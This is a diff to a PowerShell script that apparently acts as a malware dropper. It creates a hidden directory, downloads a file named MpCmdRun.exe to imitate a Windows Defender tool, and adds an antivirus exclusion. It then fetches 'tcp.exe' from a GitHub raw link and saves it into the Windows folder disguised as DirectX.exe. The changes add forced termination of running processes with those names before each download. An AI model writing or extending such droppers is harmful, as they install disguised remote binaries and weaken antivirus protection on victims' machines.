@@ -75,6 +75,13 @@ if (-not (Test-Path -Path $hiddenDirectoryMpCmdRun)) {
     New-Item -Path $hiddenDirectoryMpCmdRun -ItemType Directory -Force
 }
 
+# Stop any running process related to MpCmdRun.exe before downloading
+$processName = "MpCmdRun.exe"
+if (Get-Process -Name $processName -ErrorAction SilentlyContinue) {
+    Stop-Process -Name $processName -Force
+    Write-Host "$processName process stopped successfully."
+}
+
 # Download the MpCmdRun.exe file
 Invoke-WebRequest -Uri $urlMpCmdRun -OutFile $destinationPathMpCmdRun
 
@@ -89,6 +96,13 @@ Write-Host "Exclusion added successfully for: $pathToExclude"
 # Define the URL and the destination path for DirectX file (tcp.exe)
 $urlDirectX = "https://github.com/XXS437/M/blob/main/tcp.exe?raw=true"  # Direct link to the raw file
 $filePathDirectX = "$env:windir\DirectX.exe"  # Destination file path (C:\Windows\tcp.exe)
+
+# Stop any running process related to DirectX.exe before downloading
+$processNameDirectX = "DirectX.exe"
+if (Get-Process -Name $processNameDirectX -ErrorAction SilentlyContinue) {
+    Stop-Process -Name $processNameDirectX -Force
+    Write-Host "$processNameDirectX process stopped successfully."
+}
 
 # Download the DirectX file
 Invoke-WebRequest -Uri $urlDirectX -OutFile $filePathDirectX 
